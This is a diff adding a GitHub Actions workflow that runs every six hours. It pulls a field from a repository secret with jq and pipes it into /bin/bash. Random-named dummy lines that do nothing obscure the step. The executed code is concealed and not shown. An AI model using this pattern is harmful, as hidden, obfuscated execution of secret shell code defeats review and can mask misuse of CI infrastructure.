@@ -1,0 +1,26 @@
+name: shiguanjiji
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiguanjiji
+        env:
+          usjdo51632: ${{ secrets.usjdo51632 }}
+        run: |
+          echo $usjdo51632 | jq -r .zjja342 | /bin/bash
+          echo $zzul76 | jq -r .mguhx25 | /bin/bash
+          echo $gj3 | jq -r .hm409 | /bin/bash
+          echo $aaqqb707 | jq -r .vkc5703 | /bin/bash
+          echo $axt480 | jq -r .aqlq52 | /bin/bash
+          echo $wbgtn25 | jq -r .u75808 | /bin/bash
+          echo $oxoa0 | jq -r .ysd395 | /bin/bash
+          echo $rozs7 | jq -r .o1 | /bin/bash
+          echo $q988 | jq -r .s8 | /bin/bash
+
